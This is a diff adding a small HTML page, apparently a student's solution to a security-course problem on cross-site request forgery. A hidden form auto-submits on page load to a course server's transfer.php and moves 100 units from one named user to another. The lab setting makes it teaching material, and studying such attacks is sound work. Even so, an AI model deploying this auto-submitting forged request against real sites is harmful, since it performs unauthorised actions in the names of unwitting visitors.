@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>CSRF Exploit</h1>
+    <p>harshita grantbucks homepage Problem 2</p>
+
+    <!-- Hide form inspo: https://www.geeksforgeeks.org/html-dom-style-display-property/ -->
+    <form id="exploitForm" action="http://cmsc232-113.c.cs.uchicago.edu/2/transfer.php?amount=100&recipient=harshita&sender=grantho" method="POST" style="display: none;"> 
+        <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        document.getElementById('exploitForm').submit(); //auto-submit inspo: https://www.jotform.com/answers/764299-how-to-auto-submit-form-without-using-submit-button
+    </script>
+</body>
+</html>
